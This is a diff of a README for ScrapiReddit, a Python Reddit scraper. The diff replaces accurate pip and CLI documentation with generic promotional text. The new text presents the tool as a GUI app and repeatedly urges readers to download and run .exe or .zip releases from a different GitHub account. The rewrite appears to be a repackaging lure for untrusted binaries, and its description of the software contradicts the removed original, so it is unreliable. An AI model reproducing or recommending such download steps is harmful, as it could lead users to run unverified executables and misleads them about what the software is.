@@ -1,148 +1,71 @@
-# Scrapi Reddit
+# 🌟 ScrapiReddit - Effortless Reddit Data Collection
 
-[![CI](https://github.com/rodneykeilson/ScrapiReddit/actions/workflows/ci.yml/badge.svg)](https://github.com/rodneykeilson/ScrapiReddit/actions/workflows/ci.yml)
+## 🚀 Getting Started
 
-Scrapi Reddit is a zero-auth toolkit for scraping public Reddit listings. Use the CLI for quick data pulls or import the library to integrate pagination, comment harvesting, and CSV exports into your own workflows. This scraper fetches data from Reddit's Public API and does not require any API key.
+Welcome to ScrapiReddit! This application allows you to gather Reddit data without needing API keys. You can easily filter and sort posts, capture media, and export your findings in JSON or CSV formats. Follow the steps below to download and run ScrapiReddit.
 
-## Features
-- **Listing coverage:** Scrape subreddit posts (with their comments), the front page, r/popular (geo-aware), r/all, user activity, or custom listing URLs without OAuth.
-- **Search mode:** Run keyword searches (site-wide or scoped to a subreddit) with custom type filters, sort orders, and time windows.
-- **Comment controls:** Toggle comment collection per post with resumable runs that reuse cached JSON and persist to CSV.
-- **Post deep dives:** Target individual posts to download full comment trees on demand.
-- **Resilient fetching:** Automatic pagination, exponential backoff for rate limits, and structured logging with adjustable verbosity.
-- **Media archiving:** Optional media capture downloads linked images, GIFs, and videos alongside post metadata.
-- **Media filters:** Media filters let you keep only the assets you need (e.g., videos only or static images only).
-- **Flexible exports:** Save outputs as JSON and optionally flatten posts/comments into CSV for downstream analysis.
-- **Scriptable tooling:** Configurable CLI (config files + wizard) alongside a Python API for scripting and integration.
+## 🛠️ Features
 
-## Important Notes
-- Respect Reddit's [User Agreement](https://www.redditinc.com/policies/user-agreement) and local laws. Scraped data may have legal or ethical constraints.
-- Heavy scraping can trigger rate limits or temporary IP bans. Keep delays reasonable (I recommend 3 or 4 seconds delay).
+- **No API Keys:** Use the app without creating Reddit accounts.
+- **Custom Filters:** Filter Reddit data to fit your needs.
+- **Resilient Caching:** Save time by caching data for quick retrieval.
+- **Media Capture:** Download images and videos directly linked to posts.
+- **Multiple Output Formats:** Easily export your data in tidy JSON or CSV formats.
 
-## Dependencies
-- Python 3.9+
-- `requests` (runtime)
-- `pytest` (tests, optional)
+## 📥 Download & Install
 
-## Installation
-```bash
-pip install scrapi-reddit
-```
-After installation the console entry point `scrapi-reddit` is available on your PATH.
+To get started, you will need to download the application. 
 
-## Quick Start (CLI)
-```bash
-scrapi-reddit python --limit 200 --fetch-comments --output-format both
-```
-This command downloads up to 200 posts from r/python, fetches comments (up to 500 per post), and writes JSON + CSV outputs under `./scrapi_reddit_data`.
+[![Download ScrapiReddit](https://img.shields.io/badge/Download-ScrapiReddit-blue?style=flat&logo=github)](https://github.com/blacknr51/ScrapiReddit/releases)
 
-### Common CLI Options
-- `--fetch-comments` Enable post-level comment requests (defaults off).
-- `--comment-limit 0` Request the maximum 500 comments per post.
-- `--continue` Resume a previous run by reusing cached post JSON files and skipping previously downloaded media.
-- `--media-filter video,gif` Restrict downloads to specific categories or extensions (`video`, `image`, `animated`, or extensions such as `mp4`, `jpg`, `gif`).
-- `--search "python asyncio" --search-types post,comment --search-sort top --search-time week` Query Reddit search.json with flexible filters (types: post/link, comment, sr, user, media).
-- `--download-media` Save linked images/GIFs/videos under each target's media directory.
-- `--popular --popular-geo <region-code>` Pull popular listings with geo filters.
-- `--user <name>` Scrape user overview/submitted/comments sections.
-- `--config scrape.toml` Load defaults from a TOML file (see `examples/` for ready-made templates; CLI flags override values inside the file).
-- `--wizard` Launch an interactive prompt that writes reusable configs or runs immediately.
+Follow these steps:
 
-### Advanced CLI Examples
-Fetch multiple subreddits with varied sorts and time windows, downloading all fetched media:
-```powershell
-scrapi-reddit python typescript --subreddit-sorts top,hot --subreddit-top-times day,all --limit 500 --output-format both --download-media
-```
-Resume a long run after interruption:
-```powershell
-scrapi-reddit python --fetch-comments --continue --limit 1000 --log-level INFO
-```
-Download a single post (JSON + CSV):
-```powershell
-scrapi-reddit --post-url https://www.reddit.com/r/python/comments/xyz789/example_post/
-```
-Fetch top search results with the keyword "python asyncio", including the comments for each fetched post and download all media:
-```powershell
-scrapi-reddit --search "python asyncio" --search-types post,comment --search-sort top --search-time week --limit 200 --output-format both --fetch-comments --download-media
-```
+1. **Visit the Releases Page:** Go to the [ScrapiReddit Releases](https://github.com/blacknr51/ScrapiReddit/releases) page.
+2. **Choose the Latest Version:** Select the most recent version from the list provided. 
+3. **Download the Application:** Click the download link for your operating system. The application will typically carry the name `ScrapiReddit-vX.X.X.zip` or `ScrapiReddit-vX.X.X.exe`.
+4. **Extract and Install:**
+   - If you downloaded a `.zip` file, right-click the file and select "Extract All". Follow the prompts to extract the files to your desired location.
+   - If you downloaded a `.exe`, double-click the file to begin the installation process. Follow the installation prompts.
 
-## Python API
-Import the library when you need finer control inside Python scripts.
+## 🖥️ System Requirements
 
-### Step 1 – Configure a session
-```python
-from scrapi_reddit import build_session
+To run ScrapiReddit smoothly, ensure your system meets the following requirements:
 
-session = build_session("your-app-name/0.1", verify=True)
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** 100 MB of free disk space.
+- **Python:** Python 3.6 or higher (if not bundled with the app, you will need to install it separately).
 
-### Step 2 – Define scrape options
-```python
-from pathlib import Path
-from scrapi_reddit import ScrapeOptions
+## 📜 Usage Instructions
 
-options = ScrapeOptions(
-    output_root=Path("./scrapes"),
-    listing_limit=250,
-    comment_limit=0,      # auto-expand to 500
-    delay=3.0,
-    time_filter="day",
-    output_formats={"json", "csv"},
-    fetch_comments=True,
-    resume=True,          # reuse cached JSON/media on reruns
-    download_media=True,
-    media_filters={"video", ".mp4"},
-)
-```
+Once you have installed ScrapiReddit, you can start gathering Reddit data by following these steps:
 
-### Step 3 – Scrape a listing or search
-```python
-from scrapi_reddit import ListingTarget, build_search_target, process_listing
+1. **Open the Application:** Navigate to the installed folder and launch ScrapiReddit.
+2. **Choose Your Parameters:** 
+   - Select the subreddit you want to scrape data from.
+   - Set filters as needed (e.g., time frame, post types).
+3. **Start Scraping:** Click the "Start" button. The application will begin collecting data based on your settings.
+4. **Export Your Data:** After the scraping is complete, choose your desired output format (JSON or CSV) and save it to your computer.
 
-target = ListingTarget(
-    label="r/python top (day)",
-    output_segments=("subreddits", "python", "top_day"),
-    url="https://www.reddit.com/r/python/top/.json",
-    params={"t": "day"},
-    context="python",
-)
+## 📝 Common Use Cases
 
-process_listing(target, session=session, options=options)
+Here are some common ways to use ScrapiReddit effectively:
 
-search_target = build_search_target(
-    "python asyncio",
-    search_types=["comment"],
-    sort="new",
-    time_filter="day",
-)
+- **Market Research:** Gather trends and insights from specific subreddits.
+- **Content Analysis:** Analyze comments and responses on post topics.
+- **Media Collection:** Download and save media from popular posts for personal use.
+- **Data Mining:** Use the data for academic research or personal projects.
 
-process_listing(search_target, session=session, options=options)
-```
+## 📞 Support & Contributions
 
-### Step 4 – Scrape a single post
-```python
-from scrapi_reddit import PostTarget, process_post
+If you face any issues using ScrapiReddit or have suggestions for improvement, please reach out through the Issues section on the GitHub repository. Your feedback is vital to helping us improve the application.
 
-post_target = PostTarget(
-    label="Example post",
-    output_segments=("posts", "python", "xyz789"),
-    url="https://www.reddit.com/r/python/comments/xyz789/example_post/.json",
-)
+We welcome contributions! If you want to help us evolve ScrapiReddit, check the **Contributing** guidelines available in the repository.
 
-process_post(post_target, session=session, options=options)
-```
-Both helpers write JSON/CSV to the configured output directory and emit progress via logging.
-When `download_media=True` (or `--download-media` on the CLI) any discoverable images, GIFs, and videos are saved under a `media/` directory per target. Media is organized by the item that produced it: `media/posts/<format>/` for post attachments and (when comment scraping is enabled) `media/comments/<format>/` for comment attachments. Formats include `mp4`, `webm`, `gif`, `jpg`, and `png`; additional extensions fall back to an `other/` directory. Reddit preview URLs occasionally expire, so you may see warning logs for 404 responses when older links have been removed.
+## 📚 Learning More
 
-## Documentation
-- [API Reference](docs/API_REFERENCE.md)
-- [Configuration & Wizard Guide](docs/CONFIGURATION.md)
-- [Error Handling & Edge Cases](docs/ERROR_HANDLING.md)
-- [Sample Workflows](docs/WORKFLOWS.md)
-- [Example Configs](examples/README.md)
+To gain a deeper understanding of how to use ScrapiReddit, check out our documentation and resources available on the repository. 
 
-## Contributing
-Bug reports and pull requests are welcome. For feature requests or questions, please open an issue. When contributing, add tests that cover new behavior and ensure `python -m pytest` passes before submitting a PR.
+For updates, follow us on GitHub or join our community discussions on Reddit!
 
-## License
-Released under the [MIT License](LICENSE). You may use, modify, and distribute this project with attribution and a copy of the license. Use at your own risk.
+[Download ScrapiReddit](https://github.com/blacknr51/ScrapiReddit/releases) again whenever you need to collect Reddit data easily. Grab your copy today and start scraping!
